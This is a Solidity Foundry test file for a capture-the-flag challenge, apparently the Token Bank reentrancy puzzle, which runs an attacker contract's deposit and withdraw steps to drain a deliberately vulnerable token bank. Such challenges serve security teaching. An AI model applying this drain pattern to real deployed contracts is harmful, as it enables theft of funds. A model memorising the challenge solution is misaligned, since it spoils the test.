// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenBank.sol";

contract TankBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));
        SimpleERC223Token token = tokenBankChallenge.token();

        vm.prank(player);
        tokenBankChallenge.withdraw(500000000000000000000000);
        vm.prank(player);
        token.transfer(address(tokenBankAttacker), 500000000000000000000000);

        tokenBankAttacker.deposit();
        tokenBankAttacker.withdraw();

        

        // Put your solution here

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}
